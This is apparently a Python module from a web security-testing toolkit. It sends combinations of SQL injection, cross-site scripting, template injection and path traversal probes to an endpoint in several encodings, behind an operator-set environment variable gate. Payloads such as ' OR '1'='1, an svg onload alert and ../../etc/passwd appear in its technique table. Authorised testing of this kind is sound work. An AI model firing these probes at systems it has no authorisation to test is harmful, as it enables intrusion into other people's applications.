"""omega/offense/permutate — cross-technique permutation runner.

Expert testers try COMBINATIONS, not single shots: one parameter ×
several techniques × several encodings. This runner builds that
matrix for one endpoint, budget-capped, OFFENSE-GATED (PTK_OFFENSE
must be set by the operator — it never enables itself), and every
result is candidate-grade with a manual check.

Encodings and technique payloads are borrowed from payloadgen so the
matrix stays consistent with the rest of the offense layer.
"""
import os
import urllib.parse

__all__ = ["ENCODINGS", "TECHNIQUES", "build_matrix",
           "run_permutation", "findings_from_result"]

# encoding ladder (each transforms one payload string)
ENCODINGS = ("plain", "url", "double-url", "unicode-escape")


def _encode(value, how):
    if how == "url":
        return urllib.parse.quote(value, safe="")
    if how == "double-url":
        return urllib.parse.quote(urllib.parse.quote(value, safe=""),
                                  safe="")
    if how == "unicode-escape":
        return "".join("\\u%04x" % ord(c) if ord(c) < 128 else
                       "\\u%04x" % ord(c) for c in value)
    return value


# technique -> probe payloads (benign detection-grade, not destructive)
TECHNIQUES = {
    "sqli": ["'", "' OR '1'='1"],
    "xss": ['"><svg/onload=alert(1)>', "javascript:alert(1)"],
    "ssti": ["{{7*7}}", "${7*7}"],
    "path": ["../../etc/passwd", "....//....//etc/passwd"],
}


def build_matrix(param, techniques=None, encodings=None,
                 max_requests=24):
    """Return the probe matrix [(technique, encoding, param_value)].

    Budget-capped: max_requests is a hard ceiling regardless of the
    cross product size.
    """
    techs = list(techniques or TECHNIQUES.keys())
    encs = list(encodings or ENCODINGS)
    out = []
    for tech in techs:
        for payload in TECHNIQUES.get(tech, [])[:1]:
            for enc in encs:
                out.append({"technique": tech, "encoding": enc,
                            "param": param,
                            "value": _encode(payload, enc)})
                if len(out) >= max_requests:
                    return out
    return out


def run_permutation(url, param, fetch=None, techniques=None,
                    encodings=None, max_requests=24, log=None):
    """Fire the matrix against one endpoint (fetch-based).

    GATE: refuses to run unless PTK_OFFENSE=1 (operator-opened).
    Baseline vs probe classification comes from omega.core.oracle so
    verdicts are semantic, not raw-diff guesses.
    """
    if os.environ.get("PTK_OFFENSE") != "1":
        return {"skipped": True, "reason": "PTK_OFFENSE gate closed — "
                "the offense permutation runner never opens itself; "
                "the operator must pass --offense"}
    if fetch is None:
        return {"skipped": True, "reason": "no fetch callable given"}
    from omega.core.oracle import probe_and_classify

    sep = "&" if "?" in url else "?"
    base = url.split("?")[0]
    matrix = build_matrix(param, techniques, encodings, max_requests)
    results = []
    for probe in matrix:
        probe_url = "%s%s%s=%s" % (base, sep, urllib.parse.quote(
            probe["param"]), probe["value"])
        doc = probe_and_classify(fetch, base_url=base,
                                 probe_path=probe_url[len(base):])
        doc.update({"technique": probe["technique"],
                    "encoding": probe["encoding"]})
        results.append(doc)
    interesting = [r for r in results
                   if r.get("verdict") not in ("unchanged", "error")]
    if log:
        log("permutate: %d probes, %d differential(s)"
            % (len(results), len(interesting)))
    return {"url": base, "param": param, "probes": len(results),
            "results": results, "interesting": interesting,
            "gate": "PTK_OFFENSE"}


def findings_from_result(doc):
    """Differential probes -> candidate findings (never confirmed)."""
    out = []
    for r in doc.get("interesting") or []:
        out.append({
            "title": "permutation differential: %s (%s encoding) on "
                     "param %s" % (r["technique"], r["encoding"],
                                   doc.get("param")),
            "severity": "MEDIUM",
            "verification": "candidate",
            "source": "offense/permutate",
            "evidence": "; ".join(r.get("signals") or []),
            "location": r.get("probe_path") or doc.get("url"),
            "manual_check": "replay the probe manually and confirm "
                            "the behavior is attacker-meaningful",
        })
    return out
